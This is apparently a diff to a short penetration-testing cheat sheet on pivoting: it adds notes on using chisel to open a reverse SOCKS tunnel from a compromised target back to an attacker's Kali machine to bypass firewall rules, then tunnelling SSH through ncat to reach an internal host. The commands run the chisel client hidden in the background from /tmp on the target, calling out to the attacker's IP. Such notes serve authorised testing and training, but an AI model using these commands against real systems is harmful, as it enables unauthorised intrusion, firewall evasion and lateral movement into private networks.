@@ -1,4 +1,5 @@
-
+Chisel will create a reverse SSH Tunnel connecting from TARGET in direction to KALI:8080, to bypass firewall rules, using SOCKS.
+Inside KALI a port 1080 will be created to route the packets through SSH ProxyCommand, to a machine with Internal IP Address. NEED NCAT: Ncat will pass %H and %P as host and port.
 
 
 # Kali:
@@ -6,3 +7,6 @@ chisel server --port 8080 --reverse
 
 # Target:
 /tmp/chisel client 10.0.0.9:8080 R:socks > /dev/null 2>&1 &
+
+# Kali:
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' admin@192.168.0.1
